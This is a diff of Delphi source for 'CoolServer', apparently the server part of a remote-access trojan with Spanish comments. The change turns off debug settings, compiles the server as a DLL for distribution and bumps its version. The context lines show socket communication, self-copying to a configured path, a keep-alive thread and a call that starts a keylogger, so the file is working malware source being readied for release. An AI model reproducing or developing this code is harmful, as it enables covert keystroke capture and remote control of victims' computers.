@@ -14,11 +14,11 @@
 *)
 
 //Config del release
-{$define CommDebug}
-{$define DevConfig}
+//{$define DevConfig}
+//{$define CommDebug}
 
-//library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
-program CoolServer; //Para debug, más lineas "Para debug" abajo
+library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
+//program CoolServer; //Para debug, más lineas "Para debug" abajo
 uses
   Windows,
   SysUtils,
@@ -70,9 +70,9 @@ const
 
 procedure sendText(str: AnsiString);
 begin
+  {$ifdef CommDebug}OutputDebugString(PChar('Server OUT: ' + str));{$endif}
   sock.SendString(str);
   //sock.SendString( ZCompressStr(str) );
-  {$ifdef CommDebug}OutputDebugString(PChar('Server OUT: ' + str));{$endif}
 end;
 
 procedure CheckAlive();
@@ -165,8 +165,9 @@ begin
         break;
       end;
     end;
-  Result := input;
+
   {$ifdef CommDebug}OutputDebugString(PChar('Server IN: ' + input));{$endif}
+  Result := input;
 end;
 
 procedure Iniciar();
@@ -1384,7 +1385,7 @@ begin
   if not Configuracion.bCopiarArchivo then
     Configuracion.sCopyTo := extractfilepath(paramstr(0));
   if VersionDelServer = '' then
-    VersionDelServer := '1.14';
+    VersionDelServer := '1.15';
 
   BeginThread(nil, 0, Addr(KeepAliveThread), nil, 0, id1);
   OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
